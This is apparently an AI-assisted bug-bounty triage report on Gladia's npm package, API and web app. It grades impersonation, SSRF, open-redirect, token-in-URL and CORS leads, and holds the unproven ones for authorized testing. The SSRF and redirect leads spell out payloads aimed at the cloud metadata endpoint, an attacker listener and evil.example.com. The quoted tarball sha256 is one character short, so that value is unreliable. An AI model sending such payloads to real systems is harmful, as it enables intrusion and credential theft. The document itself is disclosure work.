### LEAD 1: npm `gladia`@0.1.3 impersonation / supply-chain confusion + WS key-in-URL leakage

| Q# | Answer |
|---|---|
| **Q1 Scope** | **YES** — npm registry is the distribution channel for the official SDK (MEDIUM priority). The unofficial `gladia` package directly impersonates the in-scope `@gladiaio/sdk`. |
| **Q2 Reachability** | **YES** — public npm registry, `dist-tag: latest`, zero barrier to `npm install gladia`. |
| **Q3 Impact** | **YES** — developers install unofficial/orphaned code believing it is official; future maintainer-account compromise → supply-chain RCE into consumer builds. Additionally, `src/client.ts:307` appends raw `x-gladia-key` to `wss://.../v2/live?x-gladia-key=<KEY>` — credential leakage to access logs/proxy/Referer. |
| **Q4 Proof (read-only)** | **YES** — fully verifiable via `npm view gladia@0.1.3` + tarball sha256 + README/package.json diff + grep client.ts. No live infra interaction needed. |
| **Q5 Novel** | **YES** — no prior report found; independently re-verified across 5 models and 20 cycles. |
| **Q6 Not rejected** | **YES** — not on the always-rejected list. This is active impersonation with a false "Official" claim, not a best-practice observation. |
| **Q7 Reasonable triager** | **YES** — a reasonable triager would accept this as a real supply-chain hygiene vulnerability. |

**Verdict: VALID**

**Minimal read-only proof:**
1. `npm view gladia@0.1.3 description repository.url maintainer time.modified`
2. `npm pack gladia@0.1.3 && tar -xzf gladia-0.1.3.tgz && cat package/package.json | grep -E '"description"|"repository"|"author"'`
3. `head -5 package/README.md` (line 3: "Unofficial TypeScript SDK")
4. `grep -n "wss://\|x-gladia-key\|baseUrl" package/src/client.ts`
5. `sha256sum gladia-0.1.3.tgz`

**Evidence summary:**
- `description` = "Official TypeScript SDK for Gladia" (package.json line 4)
- `README.md` line 3 = "Unofficial TypeScript SDK" (direct contradiction)
- `repository` = `git+https://github.com/alexisbouchez/gladia.ts.git` (personal account, **now 404/orphaned**)
- `maintainer` = `softwarecitadel@gmail.com` (personal email, not gladiaio org)
- Published 2025-03-28, **predates** official `@gladiaio/sdk` 2025-09-09
- `src/client.ts:307`: raw `x-gladia-key` appended to WS URL query string
- Tarball sha256: `3b23ec7d7a763abc04c52db232d157a982fd3bd96c9f703af3eecad5fa802f2`

**Impact:** Medium (impersonation) + Medium (key hygiene). High if maintainer account compromised.

**CVSS 3.1:** `AV:N/AC:L/PR:N/UI:R/S:U/C:L/I:L/A:N` → **4.3 (Medium)**
(Requires user action to install; no direct exploit chain without future account compromise)

**Reporting channel:** Gladia security channel per scope.yml (disclosure_policy: TBD — operator to confirm public channel before submission). Also reportable to npm Security as an abandoned-package impersonation.

### LEAD 2: SSRF via audio_url/video_url/callback_url server-side fetch

| Q# | Answer |
|---|---|
| **Q1 Scope** | **YES** — `api.gladia.io` is HIGHEST priority. |
| **Q2 Reachability** | **PARTIAL** — all SSRF-capable endpoints are key-gated (401 without `x-gladia-key`). CORS `*` allows cross-origin but **without credentials**, so an attacker cannot present a victim's key. An attacker would need their own valid key. |
| **Q3 Impact** | **YES (if key obtained)** — cloud metadata read (169.254.169.254), internal-network SSRF, callback POST to arbitrary URL enabling blind SSRF + credential exfiltration from API origin. Severity High. |
| **Q4 Proof (read-only)** | **NO** — requires a valid `x-gladia-key` to POST `{"audio_url":"http://169.254.169.254/latest/meta-data/"}` and observe reachability signal. Cannot prove without AUTH_HELPED testing. |
| **Q5 Novel** | **YES** — no prior report. |
| **Q6 Not rejected** | **YES** — genuine SSRF, not on rejected list. |
| **Q7 Reasonable triager** | **CONDITIONAL** — a triager would accept IF a valid key is obtained and reachability is demonstrated. Without proof, HOLD. |

**Verdict: HOLD** — Gated on obtaining a program-provided or authorized trial `x-gladia-key`. All 5 models and 20 cycles confirm the *design surface* (audio_url/video_url/callback_url all `format:uri` with no scheme allowlist, SDK forwards verbatim with no client-side SSRF guard per RAG of gladiaio/sdk), but no model could demonstrate actual server-side fetch without a key.

**Next step:** Request program-provided trial key, then:
1. `POST /v2/pre-recorded {"audio_url":"http://<attacker-canary>"}` (baseline)
2. `POST /v2/pre-recorded {"audio_url":"http://169.254.169.254/latest/meta-data/"}` (metadata)
3. `POST /v2/pre-recorded {"callback_config":{"url":"http://<attacker-listener>"}}` (outbound POST)
4. Compare error_code/status/timing for reachability signal.

**Potential CVSS 3.1 (if proven):** `AV:N/AC:L/PR:L/UI:N/S:C/C:H/I:L/A:N` → **7.4 (High)**

### LEAD 3: Post-auth open redirect via `redirect_to` on app.gladia.io /signin

| Q# | Answer |
|---|---|
| **Q1 Scope** | **YES** — `app.gladia.io` is HIGH priority. |
| **Q2 Reachability** | **YES** — `/signin?redirect_to=` is publicly reachable; reflection confirmed unauthenticated. |
| **Q3 Impact** | **POTENTIAL** — post-auth phishing redirect to attacker-controlled host; OAuth code/state theft if `redirect_to` is reused as `redirect_uri`. Severity Low-Med (High if redirect_uri injectable). |
| **Q4 Proof (read-only)** | **NO** — reflection into form `action` is confirmed, but post-auth honoring of `redirect_to` requires completing Google OAuth with a real session. Cannot prove without AUTH_HELPED testing. |
| **Q5 Novel** | **YES** — no prior report. |
| **Q6 Not rejected** | **YES** — genuine open redirect candidate, not self-XSS or best-practice. |
| **Q7 Reasonable triager** | **CONDITIONAL** — a triager would accept IF post-auth redirect to external host is confirmed. Without proof, HOLD. |

**Verdict: HOLD** — Reflection confirmed (form action reflects `redirect_to` for `https://evil`, `//evil`, bare-host, `app.gladia.io.evil`, path-only variants — no host allowlist at unauthenticated layer). But the critical gate — whether the server honors `redirect_to` as the post-auth 302 Location — is unverified without an authenticated Google SSO session.

**Next step:** With authorized Google SSO session:
1. `GET /signin?redirect_to=https://evil.example.com` → complete OAuth → capture final 302 Location
2. Repeat with `//evil`, `app.gladia.io.evil` variants
3. Test `redirect_to` as OAuth `redirect_uri` injection

**Potential CVSS 3.1 (if proven plain redirect):** `AV:N/AC:L/PR:N/UI:R/S:U/C:L/I:L/A:N` → **4.3 (Medium)**
**Potential CVSS 3.1 (if redirect_uri injectable):** `AV:N/AC:L/PR:N/UI:R/S:C/C:H/I:L/A:N` → **7.4 (High)**

### LEAD 4: WebSocket auth token in URL query parameter

| Q# | Answer |
|---|---|
| **Q1 Scope** | **YES** — `api.gladia.io` is HIGHEST priority. |
| **Q2 Reachability** | **YES** — token-in-URL is a design property confirmed in the public OpenAPI spec. |
| **Q3 Impact** | **YES** — tokens in URLs leak via browser history, Referer headers on WS upgrade, server/proxy access logs. Token theft enables unauthorized live transcription sessions (real-time audio access). |
| **Q4 Proof (read-only)** | **PARTIAL** — the *design* is confirmed via OpenAPI spec (`wss://api.gladia.io/v2/live?token=<uuid>`). Proving actual token theft/leakage requires a valid key to init a session and observe token behavior. |
| **Q5 Novel** | **YES** — no prior report. |
| **Q6 Not rejected** | **YES** — credential leakage via URL is a real vulnerability class, not best-practice. |
| **Q7 Reasonable triager** | **CONDITIONAL** — the design weakness is confirmed; full impact demonstration needs a key. |

**Verdict: HOLD** — Design confirmed via public OpenAPI spec (no auth needed to read spec). The token-in-URL pattern is a genuine weakness. However, proving actual token theft or session hijacking requires a valid API key to init a WS session and observe token format/lifetime.

**Minimal read-only proof (design-only):**
1. `curl -sS https://api.gladia.io/openapi.json | jq '.components.schemas.InitStreamingResponse.properties.url'`
2. Spec shows: `"example": "wss://api.gladia.io/v2/live?token=<uuid>"`

**Impact:** Token theft → unauthorized live transcription sessions, real-time audio stream access.

**Potential CVSS 3.1 (if token theft proven):** `AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:L/A:N` → **6.5 (Medium)**

### LEAD 7: CORS wildcard (`access-control-allow-origin: *`) without credentials

| **Q6 Not rejected** | **NO** — CORS wildcard without credentials is a common, non-exploitable configuration. It does not enable any attack beyond what's already possible via direct HTTP requests. |

**Verdict: INVALID** — CORS `*` without credentials is not exploitable. Public endpoints are already public. No cross-origin credentialed action possible.
